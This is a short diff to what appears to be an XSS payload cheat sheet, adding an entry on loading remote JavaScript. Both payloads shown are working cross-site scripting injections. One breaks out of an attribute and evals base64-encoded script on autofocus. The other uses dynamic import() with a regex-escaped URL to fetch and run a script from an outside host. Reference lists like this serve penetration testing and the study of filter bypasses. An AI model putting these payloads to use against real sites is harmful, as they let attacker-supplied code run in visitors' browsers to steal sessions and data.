@@ -13,6 +13,12 @@ badge: Web
 "><input onfocus=eval(atob(this.id)) id={{ xss-payload alert(1) } b64 } autofocus>
 ```
 
+Load remote Javascript, using regex inside import (Slashes must be scaped).
+
+```html
+"><input onfocus=import(/\/\/{{ js-payload-url example.com\/a.js }}/) autofocus>
+```
+
 ### Exploitation
 
 #### Execute once only
